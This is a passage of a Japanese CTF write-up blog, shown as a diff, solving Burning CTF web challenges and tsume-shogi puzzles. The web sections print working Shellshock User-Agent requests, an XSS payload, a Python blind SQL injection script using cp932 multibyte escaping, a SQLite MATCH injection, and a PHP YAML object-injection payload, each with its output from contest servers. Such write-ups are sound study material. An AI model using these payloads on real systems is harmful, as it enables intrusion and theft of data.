+<a id="192-超文書転送術-network-tools-100点" class="anchor" href="#192-%E8%B6%85%E6%96%87%E6%9B%B8%E8%BB%A2%E9%80%81%E8%A1%93-network-tools-100%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>192 超文書転送術 Network Tools （100点）</h3>
+
+<p>Aboutページにあるメッセージを読んでみます。  </p>
+
+<pre><code>About This Site
+Since 2000 we Have offered some Effective training cources , which cover network, Linux, web applications and related Licenses, to Students in worldwide. Hopefully Our services help you understand the Core Knowlegde of technologies.
+NOTE: DON'T FORGET TO FIND OUT THE HIDDEN MESSAGE HERE!
+</code></pre>
+
+<p>Since...からの文字列に不自然な大文字があります。大文字を全部つなげると<br>
+「SHELLSHOCK」<br>
+なるほど、ということでUser-agentを使ってShellShock攻撃を試みます。  </p>
+
+<pre><code>POST http://210.146.64.37:60888/exec HTTP/1.1
+Host: 210.146.64.37:60888
+Connection: keep-alive
+Content-Length: 15
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://210.146.64.37:60888
+Upgrade-Insecure-Requests: 1
+User-Agent: () { :; }; /bin/ls
+Content-Type: application/x-www-form-urlencoded
+Referer: http://210.146.64.37:60888/list
+Accept-Encoding: gzip, deflate
+Accept-Language: ja,en-US;q=0.8,en;q=0.6
+
+cmd=arp&amp;option=
+
+(response)
+HTTP/1.1 200 OK
+Date: Fri, 27 Nov 2015 14:09:26 GMT
+Server: Apache/2.2.15 (CentOS)
+Content-Length: 752
+Connection: close
+Content-Type: text/html; charset=utf-8
+
+(snip)
+  &lt;div class='headline'&gt;arp &lt;/div&gt;
+  &lt;div class='body'&gt;
+
+    flag.txt&lt;br /&gt;
+
+    logs&lt;br /&gt;
+
+    logs.py&lt;br /&gt;
+
+(snip)
+
+(response)
+POST http://210.146.64.37:60888/exec HTTP/1.1
+Host: 210.146.64.37:60888
+Connection: keep-alive
+Content-Length: 15
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://210.146.64.37:60888
+Upgrade-Insecure-Requests: 1
+User-Agent: () { :; }; /bin/cat flag.txt
+Content-Type: application/x-www-form-urlencoded
+Referer: http://210.146.64.37:60888/list
+Accept-Encoding: gzip, deflate
+Accept-Language: ja,en-US;q=0.8,en;q=0.6
+
+cmd=arp&amp;option=
+(response)
+(snip)
+  &lt;div class='headline'&gt;arp &lt;/div&gt;
+  &lt;div class='body'&gt;
+
+    flag={Update bash to the latest version!}&lt;br /&gt;
+</code></pre>
+
+<p>ということで、<br>
+<strong>Ans. flag={Update bash to the latest version!}</strong></p>
+
+<hr>
+<h3>
+<a id="193-超文書転送術-箱庭xss-100点" class="anchor" href="#193-%E8%B6%85%E6%96%87%E6%9B%B8%E8%BB%A2%E9%80%81%E8%A1%93-%E7%AE%B1%E5%BA%ADxss-100%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>193 超文書転送術 箱庭XSS （100点）</h3>
+
+<p>箱庭復活。  </p>
+
+<pre><code>Username:
+&lt;SCRIPT SRC="C:\Users\IEUser\Desktop\test.js"&gt;&lt;/script&gt;
+
+test.js:
+alert("XSS");
+</code></pre>
+
+<p>jsファイルを外部に置いて、それを読み込む形で解けます。  </p>
+
+<p><strong>Ans. FLAG is 2ztJcvm2h52WGvZxF98bcpWv</strong></p>
+
+<hr>
+<h3>
+<a id="194-超文書転送術-yamatodo-200点-26人" class="anchor" href="#194-%E8%B6%85%E6%96%87%E6%9B%B8%E8%BB%A2%E9%80%81%E8%A1%93-yamatodo-200%E7%82%B9-26%E4%BA%BA" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>194 超文書転送術 YamaToDo （200点）</h3>
+
+<p><a href="http://techracho.bpsinc.jp/baba/2010_02_17/1133">http://techracho.bpsinc.jp/baba/2010_02_17/1133</a>  </p>
+
+<p><a href="http://www.lancard.com/blog/2012/03/05/%E6%81%A5%E3%81%9A%E3%81%8B%E3%81%97%E3%81%AA%E3%81%8C%E3%82%89-php-mysql-%E3%82%B7%E3%83%95%E3%83%88jis-%E3%81%A7%E3%83%8F%E3%83%9E%E3%82%8A%E3%81%BE%E3%81%97%E3%81%9F/">http://www.lancard.com/blog/2012/03/05/%E6%81%A5%E3%81%9A%E3%81%8B%E3%81%97%E3%81%AA%E3%81%8C%E3%82%89-php-mysql-%E3%82%B7%E3%83%95%E3%83%88jis-%E3%81%A7%E3%83%8F%E3%83%9E%E3%82%8A%E3%81%BE%E3%81%97%E3%81%9F/</a>  </p>
+
+<p>この２つのサイトを読んだ後に、このソースを読むと、文字コードに関連したSQL injectionをやってみたくなります。</p>
+
+<pre><code>$sql = sprintf("insert into todos (`user_id`, `body`, `create_at`) values ('%s', '%s', NOW())",
+mysqli_real_escape_string($link, $_SESSION['user_id']),
+mysqli_real_escape_string($link, $body)
+);
+</code></pre>
+
+<p>ちなみに、ソースの  </p>
+
+<pre><code>    $ie = ($ie !== 'sjis') ? $ie : die('sjis? so sweeeeeeeeeet');
+</code></pre>
+
+<p>が地味にヒントになっています。cp932を使えば良いことが分かりますね。<br>
+user_idの最後に0x95 0x5cを入れてしまえば、実際の文字列は0x95 0x5c 0x5cとなり、shift-jisなら最後のシングルクオートを消したり、逆に0x95 0x5c 0x27 0x20とすれば、0x95 0x5c 0x5c 0x5c 0x27 0x20となるので、シングルクオートを挿入したりできます。</p>
+
+<p>ここで一点注意。</p>
+
+<p><a href="http://www.arcanaworks.jp/tips/mysql%E3%81%A7%E5%90%8C%E3%81%98%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E3%81%AE%E5%80%A4%E3%82%92%E5%85%83%E3%81%AB%E6%BC%94%E7%AE%97%E3%81%99%E3%82%8B%E6%96%B9%E6%B3%95/">http://www.arcanaworks.jp/tips/mysql%E3%81%A7%E5%90%8C%E3%81%98%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E3%81%AE%E5%80%A4%E3%82%92%E5%85%83%E3%81%AB%E6%BC%94%E7%AE%97%E3%81%99%E3%82%8B%E6%96%B9%E6%B3%95/</a></p>
+
+<pre><code>MySQLでは、サブクエリの FROM 節に追加（または更新）対象の両方に同じテーブルを指定することが出来ません。
+INSERT INTO pointTable(userID, getPoint, amountPoint)
+VALUES (1, 500, (SELECT amountPoint FROM pointTable as PT WHERE userID=1 ORDER BY id DESC LIMIT 1)-500);
+と、テーブルに別の名前をつけることで、同テーブルの値を参照して演算することができます。
+</code></pre>
+
+<p>同じテーブルを参照する時は、asが必要です。
+最終的にflagを獲得するpythonスクリプトはこんな感じです。</p>
+
+<pre><code>import urllib2
+from cookielib import CookieJar
+import datetime, time
+
+cj = CookieJar()
+
+url = 'http://210.146.64.44/?ie=cp932'
+username = 'yamatoctf'
+password = 'GUn7Sn1LVJQZBwyG8wZPAItnoBZ04Tlx'
+
+pm = urllib2.HTTPPasswordMgrWithDefaultRealm()
+pm.add_password(None, url, username, password)
+
+opener = urllib2.build_opener(urllib2.HTTPBasicAuthHandler(pm),urllib2.HTTPCookieProcessor(cj))
+urllib2.install_opener(opener)
+
+data = "user_id=wow123test1234&amp;password=wow123test4567&amp;action=login"
+
+req = urllib2.Request(url,data)
+response = urllib2.urlopen(req)
+the_page = response.read()
+
+print the_page
+
+for a in range(1,150):
+  data = 'body=12345%95%5c%27,FROM_UNIXTIME(ord(mid((select%20body%20from%20todos%20as%20td%20limit%201),' + str(a) + ',1))))%23%20'
+  print data
+
+  req = urllib2.Request(url,data)
+  response = urllib2.urlopen(req)
+  the_page = response.read()
+
+  print the_page
+  ans = ""
+  while True:
+    pos = the_page.find('&lt;span class="badge"&gt;')
+    if pos == -1:
+      break
+    base_data = the_page[ pos + 20:pos + 20+19]
+    date_time = time.strptime(base_data, "%Y-%m-%d %H:%M:%S")
+    unix_time = int(time.mktime(date_time))
+
+    ans = ans + chr(unix_time)
+    the_page = the_page[pos + 20+19:]
+  print ans
+  open("data.txt","w").write(ans)
+</code></pre>
+
+<p>このスクリプトは、新しいユーザーをregisterしてから使う必要があることに留意してください。<br>
+これで、こんな出力が得られます。</p>
+
+<pre><code>半角でサブミットしてください☆（ゝω・）v ｆｌａｇ＝｛ｒ３ｍ３Ｍｂ３ｒ＿５ｃ＿ｐｒ０ｂＬ３ｍ｝
+</code></pre>
+
+<p><strong>Ans. flag={r3m3Mb3r_5c_pr0bL3m}</strong></p>
+
+<p>解説会：session hijackingで解くことも可能だったらしい。  </p>
+
+<blockquote class="twitter-tweet" data-conversation="none" data-cards="hidden" data-partner="tweetdeck"><p lang="ja" dir="ltr">mageさん公認解法になった<a href="https://t.co/suiXZIh0Yn">https://t.co/suiXZIh0Yn</a> <a href="https://twitter.com/hashtag/burningctf?src=hash">#burningctf</a></p>&mdash; 友利奈緒 (@K_atc) <a href="https://twitter.com/K_atc/status/696238584207020033">February 7, 2016</a></blockquote>
+<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+<hr>
+<h3>
+<a id="195-超文書転送術-yamatoo-300点-17人" class="anchor" href="#195-%E8%B6%85%E6%96%87%E6%9B%B8%E8%BB%A2%E9%80%81%E8%A1%93-yamatoo-300%E7%82%B9-17%E4%BA%BA" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>195 超文書転送術 Yamatoo （300点）</h3>
+
+<pre><code>*/ || (select * from flag)--' ) /*
+</code></pre>
+
+<p>これは、内部的にはこのように展開されます。</p>
+
+<pre><code>select * from `site` where exists (select 1 from `site_fts` where `site`.rowid = `site_fts`.rowid and `words` match '*/ || (s se el le ec ct * fr ro om fl la ag g) )- -- -' ) /*') or `title` like '%*/ || (select * from flag)--' ) /*%'
+</code></pre>
+
+<p>これにより、サブクエリが実行されるはずです。<br>
+sqlite3では、matchを使ったinjectionが知られています。  </p>
+
+<pre><code>CREATE VIRTUAL TABLE t1 USING fts3(x);
+SELECT * FROM t1 WHERE t1 MATCH '"'||sqlite_version();
+malformed MATCH expression: ["3.6.23.1]
+</code></pre>
+
+<p>ちょうどMATCHが使われています。これは期待できそうです。  </p>
+
+<pre><code>"*/ || (select flag from flag))--' /*
+
+Fatal error: Uncaught exception 'Exception' with message 'malformed MATCH expression: ["* */ || (s se el le ec ct fl la ag fr ro om fl la ag g) )) )- -- -flag={3rR0r_b453d_5Ql_1nj3c710N_50_1Mp0r74n7_d0_n07_F0r637}]' in /var/www/html/index.php:67 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 67 
+</code></pre>
+
+<p><strong>Ans. flag={3rR0r_b453d_5Ql_1nj3c710N_50_1Mp0r74n7_d0_n07_F0r637}</strong></p>
+
+<p>解説会：Blind SQL injectionによる解き方が３パターンあったとのこと。<br>
+1. 文字列をそのまま不等号で比較して解く<br>
+2. flagの文字数を確定させた後、trim関数で解く<br>
+3. flagの頭が"flag={"なのを利用して、replace関数を使って解く  </p>
+
+<hr>
+<h3>
+<a id="196-超文書転送術-yamatonote-400点" class="anchor" href="#196-%E8%B6%85%E6%96%87%E6%9B%B8%E8%BB%A2%E9%80%81%E8%A1%93-yamatonote-400%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>196 超文書転送術 Yamatonote （400点）</h3>
+
+<p>yamlを使ってunserializeからのObject injectionが可能。その中にあるclass Dbが問題。<br>
+public function connect()に、SQLにそのまま文字列を渡せてしまう部分があります。  </p>
+
+<pre><code>    public function connect()
+    {
+        $this-&gt;link = mysqli_connect(YAMATONOTE_DB_HOST, YAMATONOTE_DB_USER, YAMATONOTE_DB_PASS);
+        $this-&gt;query(sprintf('use %s', YAMATONOTE_DB_NAME));
+        $this-&gt;query(sprintf('set names %s', $this-&gt;charset));
+    }
+</code></pre>
+
+<p>これは一見charsetを変えられるだけのように見えますが、<a href="https://dev.mysql.com/doc/refman/5.5/en/subqueries.html">https://dev.mysql.com/doc/refman/5.5/en/subqueries.html</a>  を読むと分かる通り、実はsetステートメントはサブクエリが使えてしまいます。これを利用してError based SQL injectionを試みます。  </p>
+
+<pre><code># yamatonote yaml template
+title: ☆（ゝω・）v
+body: test123
+x: !php/object O:2:"Db":1:{s:7:"charset";s:37:"sjis, SQL_AUTO_IS_NULL=(select 'wow')";}
+
+Variable 'sql_auto_is_null' can't be set to the value of 'wow'
+</code></pre>
+
+<p>いけそうです。</p>
+
+<pre><code># yamatonote yaml template
+title: ☆（ゝω・）v
+body: test123
+x: !php/object O:2:"Db":1:{s:7:"charset";s:61:"sjis, SQL_AUTO_IS_NULL=(select group_concat(body) from notes)";}
+
+Variable 'sql_auto_is_null' can't be set to the value of 'flag={pHp_0bj3c7_15_50_5w3333333E337_4nD_y4mL_700},a,Hello, Note! Let's enjoy:),',Hello, Note! Let's enjoy:),!!php/object,ka,hogehoge,a,Hello, Note! Let's enjoy:),Hello, Note! Let's enjoy:),Hello, Not'
+</code></pre>
+
+<p>OK!<br>
+<strong>Ans. flag={pHp_0bj3c7_15_50_5w3333333E337_4nD_y4mL_700}</strong><br>
+ちなみに想定解ではなかったようで、  </p>
+<blockquote class="twitter-tweet" data-partner="tweetdeck"><p lang="ja" dir="ltr">bonoさんのyamatonoteの解法見てビビってる（あそこにアレを突っ込めるのかと…）</p>&mdash; mage(まげ) (@mage_1868) <a href="https://twitter.com/mage_1868/status/672139145339359232">December 2, 2015</a></blockquote>
+<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
+<p>……すいません、突っ込んじゃいました。</p>
+
+<hr>
+<h3>
+<a id="197-超文書転送術-箱庭xss-2-100点" class="anchor" href="#197-%E8%B6%85%E6%96%87%E6%9B%B8%E8%BB%A2%E9%80%81%E8%A1%93-%E7%AE%B1%E5%BA%ADxss-2-100%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>197 超文書転送術 箱庭XSS 2 （100点）</h3>
+
+<p>箱庭XSSと全く同じ手法で解けます。<br><br>
+<strong>Ans. FLAG is n2SCCerG4J9kDkHqvHJNhwr4</strong></p>
+
+<hr>
+<h3>
+<a id="201-兵法術-将棋詰め壱-50点" class="anchor" href="#201-%E5%85%B5%E6%B3%95%E8%A1%93-%E5%B0%86%E6%A3%8B%E8%A9%B0%E3%82%81%E5%A3%B1-50%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>201 兵法術 将棋詰め壱 （50点）</h3>
+
+<p>最後は何故か詰め将棋です。<br>
+ソルバ使うも良し、自分で解くも良し。<br>
+これは角を69へ。（成る）<br><br>
+<strong>Ans. 4769</strong></p>
+
+<hr>
+<h3>
+<a id="202-兵法術-将棋詰め弐-100点" class="anchor" href="#202-%E5%85%B5%E6%B3%95%E8%A1%93-%E5%B0%86%E6%A3%8B%E8%A9%B0%E3%82%81%E5%BC%90-100%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>202 兵法術 将棋詰め弐 （100点）</h3>
+
+<p>被害者続出の弐。<br>
+３枚目の盤に書かれた横の数字が123756489になっているのに注意。<br><br>
+<strong>Ans. 57565756444636</strong></p>
+
+<hr>
+<h3>
+<a id="203-兵法術-将棋詰め参-150点" class="anchor" href="#203-%E5%85%B5%E6%B3%95%E8%A1%93-%E5%B0%86%E6%A3%8B%E8%A9%B0%E3%82%81%E5%8F%82-150%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>203 兵法術 将棋詰め参 （150点）</h3>
+
+<p>三手詰め。<br><br>
+<strong>Ans. 545646455747</strong></p>
+
+<hr>
+<h3>
+<a id="204-兵法術-将棋詰め四-200点" class="anchor" href="#204-%E5%85%B5%E6%B3%95%E8%A1%93-%E5%B0%86%E6%A3%8B%E8%A9%B0%E3%82%81%E5%9B%9B-200%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>204 兵法術 将棋詰め四 （200点）</h3>
+
+<p>五手詰め。<br><br>
+<strong>Ans. 26364656776656453635</strong></p>
+
+<p>以上で全完！お疲れ様でした。</p>
+
+<p>本当に素晴らしいCTFだったと思います。これほどのCTFを成功させた運営の皆さん、そして懇親会でお話できた参加者の皆さん、本当にありがとうございました！</p>
+
+      </section>
+
+    </div>
+    <!--[if !IE]><script>fixScale(document);</script><![endif]-->
+              <script type="text/javascript">
+            var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+            document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+          </script>
+          <script type="text/javascript">
+            try {
+              var pageTracker = _gat._getTracker("UA-71952117-1");
+            pageTracker._trackPageview();
+            } catch(err) {}
+          </script>
+
+  </body>
+</html>
